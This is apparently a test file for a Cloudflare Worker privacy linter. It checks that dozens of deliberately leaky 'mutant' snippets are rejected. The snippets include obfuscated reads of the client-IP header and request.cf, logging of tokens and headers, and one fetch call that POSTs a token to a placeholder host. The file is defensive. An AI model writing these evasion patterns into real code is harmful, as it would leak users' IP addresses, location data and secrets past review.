// SPDX-License-Identifier: MIT

import assert from "node:assert/strict";
import { readFileSync, readdirSync } from "node:fs";
import path from "node:path";
import { test } from "node:test";

import { ALLOWED_REQUEST_HEADERS } from "../src/privacy.js";
import { repoRoot } from "./helpers.js";
import { lintTypeScript } from "./privacy_lint.js";

function listSourceFiles(dir: string): string[] {
  const out: string[] = [];
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      out.push(...listSourceFiles(full));
      continue;
    }
    if (entry.name.endsWith(".ts")) {
      out.push(full);
    }
  }
  return out;
}

test("Worker source never reads hop-identifying fields or request.cf", () => {
  const src = path.join(repoRoot(), "worker", "src");
  const files = listSourceFiles(src);
  assert.ok(files.length > 0);
  for (const file of files) {
    const text = readFileSync(file, "utf8");
    const errors = lintTypeScript(path.relative(repoRoot(), file), text);
    assert.deepEqual(errors, [], `${file}: ${errors.join("; ")}`);
  }
});

const OLD_VARIANTS: { name: string; file: string; source: string }[] = [
  {
    name: "lowercase header name",
    file: "mutant-lowercase.ts",
    source: `
        export function read(headers: Headers): string | null {
          return headers.get("cf-connecting-ip");
        }
      `,
  },
  {
    name: "concatenated header name",
    file: "mutant-concat.ts",
    source: `
        export function read(headers: Headers): string | null {
          return headers.get("CF-" + "Connecting-IP");
        }
      `,
  },
  {
    name: "request[cf]",
    file: "mutant-index-cf.ts",
    source: `
        export function geo(request: Request): unknown {
          return request["cf"];
        }
      `,
  },
  {
    name: "destructuring cf",
    file: "mutant-destructure-cf.ts",
    source: `
        export function geo(request: Request): unknown {
          const { cf } = request;
          return cf;
        }
      `,
  },
  {
    name: "logging all headers",
    file: "mutant-log-headers.ts",
    source: `
        export function leak(request: Request): void {
          console.log([...request.headers]);
        }
      `,
  },
  {
    name: "logging the token",
    file: "mutant-log-token.ts",
    source: `
        export function leak(token: string): void {
          console.log(token);
        }
      `,
  },
  {
    name: "user-agent on the allowed set",
    file: "src/privacy.ts",
    source: `
        export const ALLOWED_REQUEST_HEADERS = [
          "content-length",
          "content-type",
          "x-turnstile-token",
          "user-agent",
        ] as const;
      `,
  },
];

const NEW_VARIANTS: { name: string; file: string; source: string }[] = [
  {
    name: "Reflect.get",
    file: "mutant-reflect-get.ts",
    source: `export function leak(request: Request): unknown { return Reflect.get(request, "cf"); }`,
  },
  {
    name: "concatenated Reflect.get",
    file: "mutant-reflect-concat.ts",
    source: `export function leak(headers: Headers): unknown { return Reflect["ge" + "t"](headers, "cf-connecting-ip"); }`,
  },
  {
    name: "globalThis.console.log",
    file: "mutant-globalthis-console.ts",
    source: `export function leak(value: string): void { globalThis.console.log(value); }`,
  },
  {
    name: "console[log]",
    file: "mutant-console-index.ts",
    source: `export function leak(value: string): void { console["log"](value); }`,
  },
  {
    name: "console alias",
    file: "mutant-console-alias.ts",
    source: `export function leak(value: string): void { const c = console; c.log(value); }`,
  },
  {
    name: "token alias",
    file: "mutant-token-alias.ts",
    source: `export function leak(token: string): string { const t = token; return t; }`,
  },
  {
    name: "destructured headers concatenated name",
    file: "mutant-destructure-headers.ts",
    source: `export function leak(request: Request): string | null { const { headers: h } = request; return h.get("cf-" + "connecting-ip"); }`,
  },
  {
    name: "element access concatenated name",
    file: "mutant-element-concat.ts",
    source: `export function leak(request: Request): unknown { return request["cf" + ""]; }`,
  },
  {
    name: "cast through readAllowedHeader",
    file: "mutant-cast-header.ts",
    source: `import { readAllowedHeader } from "./privacy.js";
      export function leak(request: Request, name: "Content-Type"): string | null {
        return readAllowedHeader(request.headers, name);
      }`,
  },
  {
    name: "console.error(o.token)",
    file: "mutant-console-error-token.ts",
    source: `export function leak(o: { token: string }): void { console.error(o.token); }`,
  },
  {
    name: "request[k]",
    file: "mutant-request-k.ts",
    source: `export function leak(request: Request, k: string): unknown { return request[k]; }`,
  },
  {
    name: "self.console",
    file: "mutant-self-console.ts",
    source: `export function leak(): void { self.console.log("x"); }`,
  },
  {
    name: "globalThis fetch",
    file: "mutant-globalthis.ts",
    source: `export function leak(): typeof fetch { return globalThis.fetch; }`,
  },
  {
    name: "Reflect.ownKeys",
    file: "mutant-reflect-keys.ts",
    source: `export function leak(request: Request): unknown { return Reflect.ownKeys(request); }`,
  },
  {
    name: "env computed",
    file: "mutant-env-k.ts",
    source: `export function leak(env: Record<string, string>, k: string): string { return env[k]; }`,
  },
  {
    name: "headers computed",
    file: "mutant-headers-k.ts",
    source: `export function leak(headers: Headers, k: string): unknown { return headers[k]; }`,
  },
  {
    name: "request.headers computed",
    file: "mutant-request-headers-k.ts",
    source: `export function leak(request: Request, name: string): unknown { return request.headers[name]; }`,
  },
  {
    name: "secret binding",
    file: "mutant-secret.ts",
    source: `export function leak(secret: string): string { return secret; }`,
  },
  {
    name: "console.log request",
    file: "mutant-console-request.ts",
    source: `export function leak(request: Request): void { console.log(request); }`,
  },
  {
    name: "globalThis console index",
    file: "mutant-globalthis-index.ts",
    source: `export function leak(): void { (globalThis as typeof globalThis).console.log(1); }`,
  },
];

const ROUND4_VARIANTS: { name: string; file: string; source: string }[] = [
  {
    name: "concatenated request headers",
    file: "mutant-request-head-ers.ts",
    source: `export function leak(request: Request): unknown { return (request as any)["head" + "ers"]; }`,
  },
  {
    name: "readAllowedHeader function-name exemption",
    file: "mutant-named-read-allowed.ts",
    source: `export function readAllowedHeader(request: Request): Headers { return request.headers; }`,
  },
  {
    name: "logJson turnstileToken shorthand",
    file: "mutant-logjson-token.ts",
    source: `declare function logJson(value: unknown): void;
      export function leak(turnstileToken: string): void { logJson({ turnstileToken }); }`,
  },
  {
    name: "Object.fromEntries request headers",
    file: "mutant-fromentries.ts",
    source: `export function leak(request: Request): unknown { return Object.fromEntries(request["headers"]); }`,
  },
  {
    name: "spread request headers",
    file: "mutant-spread-headers.ts",
    source: `export function leak(request: Request): unknown { return [...request["headers"]]; }`,
  },
  {
    name: "Object.getOwnPropertyDescriptor request",
    file: "mutant-gopd.ts",
    source: `export function leak(request: Request): unknown { return Object.getOwnPropertyDescriptor(request, "cf"); }`,
  },
  {
    name: "Object.entries request",
    file: "mutant-object-entries.ts",
    source: `declare function logJson(value: unknown): void;
      export function leak(request: Request): void { logJson(Object.entries(request)); }`,
  },
  {
    name: "fetch exfiltrates token",
    file: "mutant-fetch-token.ts",
    source: `export function leak(token: string): Promise<Response> { return fetch("https://example.invalid/", { method: "POST", body: token }); }`,
  },
  {
    name: "token in Error message",
    file: "mutant-error-token.ts",
    source: `export function leak(token: string): Error { return new Error(token); }`,
  },
];

test("privacy lint rejects the seven older bypass variants", () => {
  for (const variant of OLD_VARIANTS) {
    const errors = lintTypeScript(variant.file, variant.source);
    assert.ok(errors.length > 0, `${variant.name} must fail the privacy lint`);
  }
});

test("privacy lint rejects the twenty structural bypass variants", () => {
  assert.equal(NEW_VARIANTS.length, 20);
  for (const variant of NEW_VARIANTS) {
    const errors = lintTypeScript(variant.file, variant.source);
    assert.ok(errors.length > 0, `${variant.name} must fail the privacy lint`);
  }
});

test("privacy lint rejects the nine remaining bypass variants", () => {
  assert.equal(ROUND4_VARIANTS.length, 9);
  for (const variant of ROUND4_VARIANTS) {
    const errors = lintTypeScript(variant.file, variant.source);
    assert.ok(errors.length > 0, `${variant.name} must fail the privacy lint`);
  }
});

test("allowed request headers are exactly the three the Worker reads", () => {
  assert.deepEqual([...ALLOWED_REQUEST_HEADERS].sort(), [
    "content-length",
    "content-type",
    "x-turnstile-token",
  ]);
});
